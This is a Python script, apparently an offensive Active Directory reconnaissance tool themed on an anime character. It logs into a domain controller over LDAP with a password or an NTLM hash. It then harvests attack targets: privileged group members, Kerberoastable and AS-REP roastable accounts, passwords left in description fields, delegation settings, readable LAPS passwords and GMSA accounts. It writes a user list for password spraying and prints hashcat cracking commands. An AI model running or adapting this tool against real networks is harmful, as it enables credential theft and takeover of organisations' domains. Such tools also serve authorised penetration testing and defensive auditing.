#!/usr/bin/env python3
"""
Domain Expansion: Infinite Void — AD object isolation tool.

Forged with the absolute perception of Gojo Satoru. Freezes a
Domain Controller via LDAP and strips it of every high-value
target: privileged groups, Kerberoastable/AS-REP accounts,
delegation configs, LAPS passwords, GMSA, leaked creds,
password policy, trusts, and more.

Requires: ldap3 (pip install ldap3)
"""

import argparse
import json
import os
import sys
import time
from datetime import datetime

try:
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, Tls
    import ssl
except ImportError:
    print("[!] ldap3 not installed. Run: pip install ldap3")
    sys.exit(1)

# ═══════ Gojo's Aesthetic Palette ═══════
SIX_EYES_BLUE = "\033[38;5;39m"
LIMITLESS_PURPLE = "\033[38;5;129m"
VOID_BLACK = "\033[38;5;236m"
INFINITY_WHITE = "\033[38;5;255m"
CURSED_RED = "\033[38;5;196m"
DOMAIN_GOLD = "\033[38;5;220m"
HOLLOW_CYAN = "\033[38;5;87m"
RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"

FINDINGS = []

def banner():
    print(f"""{SIX_EYES_BLUE}{BOLD}
    ┌──────────────────────────────────────────────────────────────┐
    │                                                              │
    │   [🫸🔴🫷🔵]  DOMAIN EXPANSION: INFINITE VOID               │
    │                                                              │
    │      "Throughout Heaven and Earth, I alone am the            │
    │       honored one."                                          │
    │                                                              │
    │      Paralyze the Domain with Absolute Perception.           │
    │                                             — Gojo Satoru    │
    │                                                              │
    └──────────────────────────────────────────────────────────────┘{RESET}
    {DIM}    Husky Hacker  ×  Infinite Void v2.0{RESET}
""")

def technique(name, color=SIX_EYES_BLUE):
    print(f"\n{color}{BOLD}{'═' * 60}")
    print(f"  TECHNIQUE: {name}")
    print(f"{'═' * 60}{RESET}")

def finding(msg):
    FINDINGS.append(msg)

def info(msg):
    print(f"  {VOID_BLACK}[*]{RESET} {msg}")

def hit(msg):
    print(f"  {LIMITLESS_PURPLE}[+]{RESET} {msg}")

def warn(msg):
    print(f"  {CURSED_RED}[!]{RESET} {msg}")

def table_header(*cols):
    widths = cols
    header = "  │ " + " │ ".join(f"{c:<{w}}" if isinstance(w, int) else c for c, w in zip(cols, [40]*len(cols)))
    # Just print column names
    names = [c for c in cols]
    print(f"  {DIM}{'─' * 70}{RESET}")

def print_row(*values):
    row = "  │ " + " │ ".join(str(v)[:50] for v in values) + " │"
    print(f"  {INFINITY_WHITE}{row}{RESET}")


# ═══════════════════════════════════════════════════════════
#                    LDAP QUERIES
# ═══════════════════════════════════════════════════════════

def query_group_members(conn, base_dn, group_name, label):
    """Query members of a specific group."""
    conn.search(
        search_base=base_dn,
        search_filter=f"(&(objectCategory=group)(samAccountName={group_name}))",
        attributes=["member", "distinguishedName"]
    )
    members = []
    if conn.entries:
        raw = conn.entries[0].member.values if hasattr(conn.entries[0].member, 'values') else conn.entries[0].member
        if isinstance(raw, str):
            raw = [raw]
        for m in raw:
            if m:
                # Extract CN from DN
                cn = m.split(",")[0].replace("CN=", "") if "CN=" in m else m
                members.append({"dn": str(m), "cn": cn})
                hit(f"{cn}")
                finding(f"{label}: {cn}")
    if not members:
        info(f"No members found in {group_name}")
    return members


def query_privileged_groups(conn, base_dn):
    """THE SIX EYES — enumerate all privileged group memberships."""
    technique("THE SIX EYES — Privileged Group Isolation", SIX_EYES_BLUE)

    groups = {
        "Domain Admins": "Absolute domain control",
        "Enterprise Admins": "Forest-wide administrative access",
        "Administrators": "Local admin on the DC",
        "Backup Operators": "Can backup SAM/SYSTEM → offline hash extraction",
        "Server Operators": "Can modify services on DC → binpath hijack",
        "Account Operators": "Can modify non-admin accounts → password reset chain",
        "DnsAdmins": "Can load malicious DLL via DNS service",
        "Remote Desktop Users": "RDP access",
        "Remote Management Users": "WinRM / Evil-WinRM access",
        "Group Policy Creator Owners": "Can create/modify GPOs",
    }

    all_members = {}
    for group, desc in groups.items():
        print(f"\n  {DOMAIN_GOLD}▸ {group}{RESET} {DIM}({desc}){RESET}")
        members = query_group_members(conn, base_dn, group, group)
        if members:
            all_members[group] = members

    return all_members


def query_kerberoastable(conn, base_dn):
    """LAPSE BLUE — Kerberoastable service accounts."""
    technique("LAPSE BLUE — Kerberoastable Accounts", SIX_EYES_BLUE)

    conn.search(
        search_base=base_dn,
        search_filter="(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)(!(samAccountName=krbtgt)))",
        attributes=["samAccountName", "servicePrincipalName", "description",
                     "memberOf", "adminCount", "pwdLastSet"]
    )

    results = []
    for entry in conn.entries:
        name = str(entry.samAccountName)
        spn = str(entry.servicePrincipalName)
        desc = str(entry.description) if hasattr(entry, 'description') else ""
        admin = str(entry.adminCount) if hasattr(entry, 'adminCount') else "0"

        is_admin = "1" in admin
        severity = f"{CURSED_RED}HIGH (AdminCount=1){RESET}" if is_admin else "Normal"

        hit(f"{name} → SPN: {spn}")
        if desc and desc != "[]":
            print(f"    {DIM}Description: {desc}{RESET}")
        if is_admin:
            warn(f"  AdminCount=1 — high-value target!")
            finding(f"Kerberoastable admin: {name} (SPN: {spn})")
        else:
            finding(f"Kerberoastable: {name} (SPN: {spn})")

        results.append({"name": name, "spn": spn, "description": desc, "adminCount": is_admin})

    if not results:
        info("No Kerberoastable accounts found")
    else:
        print(f"\n  {HOLLOW_CYAN}→ Crack with: hashcat -m 13100 kerberoast.hash rockyou.txt{RESET}")

    return results


def query_asrep(conn, base_dn):
    """REVERSAL RED — AS-REP Roastable accounts."""
    technique("REVERSAL RED — AS-REP Roastable Accounts", LIMITLESS_PURPLE)

    conn.search(
        search_base=base_dn,
        search_filter="(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
        attributes=["samAccountName", "description", "memberOf"]
    )

    results = []
    for entry in conn.entries:
        name = str(entry.samAccountName)
        desc = str(entry.description) if hasattr(entry, 'description') else ""
        hit(f"{name} — Pre-Auth DISABLED")
        if desc and desc != "[]":
            print(f"    {DIM}Description: {desc}{RESET}")
        finding(f"AS-REP Roastable: {name}")
        results.append({"name": name, "description": desc})

    if not results:
        info("No AS-REP Roastable accounts found")
    else:
        print(f"\n  {HOLLOW_CYAN}→ Crack with: hashcat -m 18200 asrep.hash rockyou.txt{RESET}")

    return results


def query_password_descriptions(conn, base_dn):
    """HOLLOW PURPLE — leaked passwords in description fields."""
    technique("HOLLOW PURPLE — Password Leaks in Descriptions", LIMITLESS_PURPLE)

    # Broader search — catch pass, pwd, cred, temp, default, initial
    keywords = ["pass", "pwd", "cred", "temp", "default", "initial", "secret", "key"]
    results = []

    for kw in keywords:
        conn.search(
            search_base=base_dn,
            search_filter=f"(&(objectCategory=person)(objectClass=user)(description=*{kw}*))",
            attributes=["samAccountName", "description"]
        )
        for entry in conn.entries:
            name = str(entry.samAccountName)
            desc = str(entry.description)
            if name not in [r["name"] for r in results]:
                hit(f"{name} → {desc}")
                finding(f"Password in description: {name} → {desc}")
                results.append({"name": name, "description": desc})

    if not results:
        info("No leaked passwords found in descriptions")

    return results


def query_delegation(conn, base_dn):
    """CURSED TECHNIQUE: AMPLIFICATION — delegation misconfigurations."""
    technique("AMPLIFICATION — Delegation Misconfigurations", CURSED_RED)

    results = {"unconstrained": [], "constrained": [], "rbcd": []}

    # Unconstrained delegation (TRUSTED_FOR_DELEGATION, excluding DCs)
    conn.search(
        search_base=base_dn,
        search_filter="(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))",
        attributes=["samAccountName", "dNSHostName"]
    )
    for entry in conn.entries:
        name = str(entry.samAccountName)
        dns = str(entry.dNSHostName) if hasattr(entry, 'dNSHostName') else ""
        warn(f"UNCONSTRAINED delegation: {name} ({dns})")
        finding(f"Unconstrained delegation: {name}")
        results["unconstrained"].append({"name": name, "dns": dns})

    # Constrained delegation
    conn.search(
        search_base=base_dn,
        search_filter="(&(objectClass=*)(msDS-AllowedToDelegateTo=*))",
        attributes=["samAccountName", "msDS-AllowedToDelegateTo", "objectClass"]
    )
    for entry in conn.entries:
        name = str(entry.samAccountName)
        targets = entry["msDS-AllowedToDelegateTo"].values if hasattr(entry["msDS-AllowedToDelegateTo"], 'values') else [str(entry["msDS-AllowedToDelegateTo"])]
        hit(f"CONSTRAINED delegation: {name} → {', '.join(str(t) for t in targets)}")
        finding(f"Constrained delegation: {name}")
        results["constrained"].append({"name": name, "targets": [str(t) for t in targets]})

    # RBCD (resource-based constrained delegation)
    conn.search(
        search_base=base_dn,
        search_filter="(&(objectClass=*)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))",
        attributes=["samAccountName", "msDS-AllowedToActOnBehalfOfOtherIdentity"]
    )
    for entry in conn.entries:
        name = str(entry.samAccountName)
        hit(f"RBCD configured on: {name}")
        finding(f"RBCD on: {name}")
        results["rbcd"].append({"name": name})

    if not any(results.values()):
        info("No delegation misconfigurations found")

    return results


def query_laps(conn, base_dn):
    """DOMAIN AMPLIFICATION — LAPS password extraction."""
    technique("DOMAIN AMPLIFICATION — LAPS Passwords", DOMAIN_GOLD)

    # Try both old LAPS and new Windows LAPS attribute names
    for attr in ["ms-Mcs-AdmPwd", "msLAPS-Password", "msLAPS-EncryptedPassword"]:
        conn.search(
            search_base=base_dn,
            search_filter=f"(&(objectCategory=computer)({attr}=*))",
            attributes=["samAccountName", "dNSHostName", attr]
        )
        for entry in conn.entries:
            name = str(entry.samAccountName)
            pwd = str(entry[attr]) if attr in entry.entry_attributes else "encrypted"
            warn(f"LAPS password readable: {name} → {pwd}")
            finding(f"LAPS password: {name}")

    if not conn.entries:
        info("No readable LAPS passwords (need higher privileges or LAPS not deployed)")


def query_gmsa(conn, base_dn):
    """LIMITLESS — GMSA account enumeration."""
    technique("LIMITLESS — Group Managed Service Accounts", LIMITLESS_PURPLE)

    conn.search(
        search_base=base_dn,
        search_filter="(&(objectClass=msDS-GroupManagedServiceAccount))",
        attributes=["samAccountName", "msDS-GroupMSAMembership", "msDS-ManagedPasswordInterval",
                     "description", "memberOf"]
    )

    results = []
    for entry in conn.entries:
        name = str(entry.samAccountName)
        hit(f"GMSA account: {name}")
        finding(f"GMSA account: {name}")
        results.append({"name": name})

    if not results:
        info("No GMSA accounts found")
    else:
        print(f"\n  {HOLLOW_CYAN}→ Read password with: bloodyAD get object <gmsa> --attr msDS-ManagedPassword{RESET}")

    return results


def query_admin_count(conn, base_dn):
    """PERCEPTION — AdminCount=1 users (historically privileged)."""
    technique("PERCEPTION — AdminCount=1 Users", SIX_EYES_BLUE)

    conn.search(
        search_base=base_dn,
        search_filter="(&(objectCategory=person)(objectClass=user)(adminCount=1))",
        attributes=["samAccountName", "memberOf", "description", "lastLogon"]
    )

    results = []
    for entry in conn.entries:
        name = str(entry.samAccountName)
        desc = str(entry.description) if hasattr(entry, 'description') else ""
        hit(f"{name}")
        if desc and desc != "[]":
            print(f"    {DIM}Description: {desc}{RESET}")
        results.append({"name": name, "description": desc})

    if not results:
        info("No AdminCount=1 users found")
    else:
        info(f"{len(results)} privileged user(s) found")

    return results


def query_password_policy(conn, base_dn):
    """BARRIER — Domain password policy."""
    technique("BARRIER — Password Policy", VOID_BLACK)

    conn.search(
        search_base=base_dn,
        search_filter="(objectClass=domain)",
        attributes=["minPwdLength", "maxPwdAge", "minPwdAge",
                     "lockoutThreshold", "lockOutObservationWindow",
                     "lockoutDuration", "pwdHistoryLength", "pwdProperties"]
    )

    if conn.entries:
        entry = conn.entries[0]
        attrs = {
            "Min Password Length": "minPwdLength",
            "Lockout Threshold": "lockoutThreshold",
            "Password History": "pwdHistoryLength",
        }
        for label, attr in attrs.items():
            val = str(entry[attr]) if attr in entry.entry_attributes else "N/A"
            info(f"{label}: {INFINITY_WHITE}{val}{RESET}")

        lockout = str(entry["lockoutThreshold"]) if "lockoutThreshold" in entry.entry_attributes else "0"
        if lockout == "0":
            warn("No account lockout policy — password spraying is SAFE")
            finding("No lockout policy — spray freely")
        else:
            info(f"Lockout after {lockout} attempts — spray carefully")

    return {}


def query_password_never_expires(conn, base_dn):
    """INFINITY — accounts with password never expires."""
    technique("INFINITY — Password Never Expires", HOLLOW_CYAN)

    # DONT_EXPIRE_PASSWORD = 65536
    conn.search(
        search_base=base_dn,
        search_filter="(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(isCriticalSystemObject=TRUE)))",
        attributes=["samAccountName", "description", "pwdLastSet"]
    )

    results = []
    for entry in conn.entries:
        name = str(entry.samAccountName)
        hit(f"{name} — password NEVER expires")
        results.append({"name": name})

    if not results:
        info("No non-system accounts with password never expires")
    else:
        info(f"{len(results)} account(s) with password never expires")
        finding(f"{len(results)} accounts with password never expires")

    return results


def query_domain_computers(conn, base_dn):
    """SCANNING — domain computers with OS info."""
    technique("SCANNING — Domain Computers", VOID_BLACK)

    conn.search(
        search_base=base_dn,
        search_filter="(objectCategory=computer)",
        attributes=["samAccountName", "dNSHostName", "operatingSystem",
                     "operatingSystemVersion", "lastLogon"]
    )

    results = []
    for entry in conn.entries:
        name = str(entry.samAccountName)
        dns = str(entry.dNSHostName) if hasattr(entry, 'dNSHostName') else ""
        os_name = str(entry.operatingSystem) if hasattr(entry, 'operatingSystem') else "Unknown"
        hit(f"{name:<25} {os_name}")
        results.append({"name": name, "dns": dns, "os": os_name})

    info(f"{len(results)} computer(s) found")
    return results


def query_domain_trusts(conn, base_dn):
    """DIMENSIONAL RIFT — domain trust relationships."""
    technique("DIMENSIONAL RIFT — Domain Trusts", CURSED_RED)

    conn.search(
        search_base=base_dn,
        search_filter="(objectClass=trustedDomain)",
        attributes=["flatName", "trustPartner", "trustDirection", "trustType"]
    )

    results = []
    directions = {"1": "Inbound", "2": "Outbound", "3": "Bidirectional"}

    for entry in conn.entries:
        partner = str(entry.trustPartner) if hasattr(entry, 'trustPartner') else "Unknown"
        direction = str(entry.trustDirection) if hasattr(entry, 'trustDirection') else "?"
        dir_label = directions.get(direction, direction)
        hit(f"Trust: {partner} ({dir_label})")
        finding(f"Domain trust: {partner} ({dir_label})")
        results.append({"partner": partner, "direction": dir_label})

    if not results:
        info("No domain trusts found (single-domain environment)")

    return results


def query_all_users(conn, base_dn):
    """MAP — all domain users for spray list."""
    technique("MAP — Domain User Dump", VOID_BLACK)

    conn.search(
        search_base=base_dn,
        search_filter="(&(objectCategory=person)(objectClass=user))",
        attributes=["samAccountName"],
        paged_size=1000
    )

    users = []
    for entry in conn.entries:
        name = str(entry.samAccountName)
        users.append(name)

    info(f"{len(users)} domain user(s) found")

    if users:
        print(f"\n  {HOLLOW_CYAN}→ User list for spraying/roasting saved to output{RESET}")

    return users


# ═══════════════════════════════════════════════════════════
#                    OUTPUT
# ═══════════════════════════════════════════════════════════

def save_output(all_data, domain, output_dir="."):
    """Save results to JSON and user list."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = domain.split(".")[0]

    # JSON report
    json_file = os.path.join(output_dir, f"{prefix}_void_{timestamp}.json")
    with open(json_file, "w") as f:
        json.dump(all_data, f, indent=2, default=str)
    info(f"JSON report → {json_file}")

    # User list for spraying
    if "users" in all_data and all_data["users"]:
        users_file = os.path.join(output_dir, f"{prefix}_users.txt")
        with open(users_file, "w") as f:
            for u in all_data["users"]:
                f.write(u + "\n")
        info(f"User list → {users_file} ({len(all_data['users'])} users)")

    # Kerberoastable list
    if "kerberoastable" in all_data and all_data["kerberoastable"]:
        kerb_file = os.path.join(output_dir, f"{prefix}_kerberoastable.txt")
        with open(kerb_file, "w") as f:
            for k in all_data["kerberoastable"]:
                f.write(f"{k['name']}:{k['spn']}\n")
        info(f"Kerberoastable list → {kerb_file}")

    return json_file


# ═══════════════════════════════════════════════════════════
#                    MAIN
# ═══════════════════════════════════════════════════════════

def parse_args():
    p = argparse.ArgumentParser(
        description="Domain Expansion: Infinite Void — AD Object Isolation Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 infinite_void.py -d corp.local -u megumi -p 'Shadows123!' -dc 10.10.11.200\n"
            "  python3 infinite_void.py -d corp.local -u satoru -H 31d6cfe0d16ae931b73c59d7e0c089c0 -dc 10.10.11.200\n"
            "  python3 infinite_void.py -d corp.local -u user -p pass -dc 10.10.11.200 --ldaps\n"
            "  python3 infinite_void.py -d corp.local -u user -p pass -dc 10.10.11.200 -o ./loot/\n"
        ),
    )
    p.add_argument("-d", "--domain", required=True, help="Domain (e.g. corp.local)")
    p.add_argument("-u", "--user", required=True, help="Username")

    creds = p.add_mutually_exclusive_group(required=True)
    creds.add_argument("-p", "--password", help="Plaintext password")
    creds.add_argument("-H", "--hash", help="NTLM hash (LM:NT or just NT)")

    p.add_argument("-dc", "--dc-ip", required=True, help="Domain Controller IP")
    p.add_argument("--ldaps", action="store_true", help="Use LDAPS (port 636)")
    p.add_argument("-o", "--output", default=".", help="Output directory (default: current)")
    p.add_argument("--users-only", action="store_true", help="Only dump user list and exit")
    return p.parse_args()


def main():
    banner()
    args = parse_args()

    base_dn = ",".join(f"DC={part}" for part in args.domain.split("."))
    netbios = args.domain.split(".")[0].upper()
    user_dn = f"{netbios}\\{args.user}"

    # Format hash if provided
    if args.hash:
        h = args.hash
        if ":" not in h:
            h = f"00000000000000000000000000000000:{h}"
        auth_secret = h.lower()
        info("Processing NTLM hash for Pass-the-Hash...")
    else:
        auth_secret = args.password

    # Connect — try plain LDAP first, auto-fallback to LDAPS
    info(f"Six Eyes active. Target mapped at {args.dc_ip}...")

    conn = None
    methods = []

    if args.ldaps:
        # User explicitly asked for LDAPS — only try that
        methods = [("LDAPS (port 636)", True)]
    else:
        # Try plain first, fallback to LDAPS
        methods = [("LDAP (port 389)", False), ("LDAPS (port 636)", True)]

    for method_name, use_ssl in methods:
        try:
            info(f"Trying {method_name}...")
            if use_ssl:
                tls_config = Tls(validate=ssl.CERT_NONE)
                server = Server(args.dc_ip, port=636, use_ssl=True, tls=tls_config, get_info=ALL)
            else:
                server = Server(args.dc_ip, get_info=ALL)

            conn = Connection(server, user=user_dn, password=auth_secret,
                             authentication=NTLM, auto_bind=True)
            print(f"\n  {LIMITLESS_PURPLE}{BOLD}[+] Domain Expansion: Muryokusho!{RESET}")
            print(f"  {LIMITLESS_PURPLE}    Connected via {method_name}.{RESET}")
            print(f"  {LIMITLESS_PURPLE}    The target is frozen in Infinite Void.{RESET}\n")
            break
        except Exception as e:
            err_str = str(e).lower()
            if "strongerauthreq" in err_str or "stronger" in err_str:
                if not use_ssl:
                    warn(f"{method_name} rejected — DC requires encryption. Trying LDAPS...")
                    continue
            warn(f"Domain Expansion collapsed on {method_name}! {e}")
            conn = None

    if conn is None:
        warn("All connection methods failed. Check creds, domain, and DC IP.")
        info("Manual test: ldapsearch -x -H ldaps://<DC_IP> -D 'DOMAIN\\\\user' -w 'pass' -b '' -s base")
        sys.exit(1)

    start_time = time.time()
    os.makedirs(args.output, exist_ok=True)

    all_data = {"domain": args.domain, "dc": args.dc_ip, "user": args.user}

    # Users only mode
    if args.users_only:
        all_data["users"] = query_all_users(conn, base_dn)
        save_output(all_data, args.domain, args.output)
        conn.unbind()
        return

    # Full enumeration
    all_data["privileged_groups"] = query_privileged_groups(conn, base_dn)
    all_data["kerberoastable"] = query_kerberoastable(conn, base_dn)
    all_data["asrep_roastable"] = query_asrep(conn, base_dn)
    all_data["password_descriptions"] = query_password_descriptions(conn, base_dn)
    all_data["delegation"] = query_delegation(conn, base_dn)
    all_data["laps"] = query_laps(conn, base_dn)
    all_data["gmsa"] = query_gmsa(conn, base_dn)
    all_data["admin_count"] = query_admin_count(conn, base_dn)
    all_data["password_policy"] = query_password_policy(conn, base_dn)
    all_data["password_never_expires"] = query_password_never_expires(conn, base_dn)
    all_data["computers"] = query_domain_computers(conn, base_dn)
    all_data["trusts"] = query_domain_trusts(conn, base_dn)
    all_data["users"] = query_all_users(conn, base_dn)

    # Save output
    technique("OUTPUT", DOMAIN_GOLD)
    json_file = save_output(all_data, args.domain, args.output)

    # Summary
    elapsed = time.time() - start_time
    print(f"\n{SIX_EYES_BLUE}{BOLD}{'═' * 60}")
    print(f"  INFINITE VOID — MISSION COMPLETE")
    print(f"{'═' * 60}{RESET}")
    print(f"  {INFINITY_WHITE}Domain:     {args.domain}{RESET}")
    print(f"  {INFINITY_WHITE}DC:         {args.dc_ip}{RESET}")
    print(f"  {INFINITY_WHITE}Elapsed:    {elapsed:.1f}s{RESET}")
    print(f"  {INFINITY_WHITE}Users:      {len(all_data.get('users', []))}{RESET}")
    print(f"  {INFINITY_WHITE}Computers:  {len(all_data.get('computers', []))}{RESET}")

    if FINDINGS:
        print(f"\n  {CURSED_RED}{BOLD}FINDINGS ({len(FINDINGS)}):{RESET}")
        for f in FINDINGS:
            print(f"  {LIMITLESS_PURPLE}▸{RESET} {f}")
    else:
        print(f"\n  {DIM}No critical findings — check output files for full data{RESET}")

    print(f"\n  {HOLLOW_CYAN}\"Stand proud. You are strong.\"{RESET}")
    print(f"{SIX_EYES_BLUE}{BOLD}{'═' * 60}{RESET}\n")

    conn.unbind()


if __name__ == "__main__":
    main()
